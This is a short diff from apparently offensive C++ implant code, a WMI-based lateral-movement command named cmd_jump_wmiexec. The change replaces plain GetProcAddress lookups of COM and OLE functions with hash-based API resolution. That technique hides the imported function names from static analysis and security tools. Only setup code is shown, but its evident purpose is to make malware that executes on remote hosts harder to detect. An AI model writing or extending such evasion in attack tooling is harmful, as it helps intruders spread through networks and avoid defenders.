@@ -151,26 +151,26 @@ auto declfn starburst::cmd_jump_wmiexec(
     }
 
     auto pCoInitializeEx = reinterpret_cast<fnCoInitializeEx>(
-        inst.kernel32.GetProcAddress( h_ole32,
-            symbol<char*>( const_cast<char*>( "CoInitializeEx" ) ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_ole32 ),
+            expr::hash_string( "CoInitializeEx" ) ) );
     auto pCoUninitialize = reinterpret_cast<fnCoUninitialize>(
-        inst.kernel32.GetProcAddress( h_ole32,
-            symbol<char*>( const_cast<char*>( "CoUninitialize" ) ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_ole32 ),
+            expr::hash_string( "CoUninitialize" ) ) );
     auto pCoCreateInstance = reinterpret_cast<fnCoCreateInstance>(
-        inst.kernel32.GetProcAddress( h_ole32,
-            symbol<char*>( const_cast<char*>( "CoCreateInstance" ) ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_ole32 ),
+            expr::hash_string( "CoCreateInstance" ) ) );
     auto pCoInitializeSecurity = reinterpret_cast<fnCoInitializeSecurity>(
-        inst.kernel32.GetProcAddress( h_ole32,
-            symbol<char*>( const_cast<char*>( "CoInitializeSecurity" ) ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_ole32 ),
+            expr::hash_string( "CoInitializeSecurity" ) ) );
     auto pCoSetProxyBlanket = reinterpret_cast<fnCoSetProxyBlanket>(
-        inst.kernel32.GetProcAddress( h_ole32,
-            symbol<char*>( const_cast<char*>( "CoSetProxyBlanket" ) ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_ole32 ),
+            expr::hash_string( "CoSetProxyBlanket" ) ) );
     auto pSysAllocString = reinterpret_cast<fnSysAllocString>(
-        inst.kernel32.GetProcAddress( h_oleaut32,
-            symbol<char*>( const_cast<char*>( "SysAllocString" ) ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_oleaut32 ),
+            expr::hash_string( "SysAllocString" ) ) );
     auto pSysFreeString = reinterpret_cast<fnSysFreeString>(
-        inst.kernel32.GetProcAddress( h_oleaut32,
-            symbol<char*>( const_cast<char*>( "SysFreeString" ) ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_oleaut32 ),
+            expr::hash_string( "SysFreeString" ) ) );
 
     if ( !pCoInitializeEx || !pCoCreateInstance || !pCoSetProxyBlanket ||
          !pSysAllocString || !pSysFreeString ) {
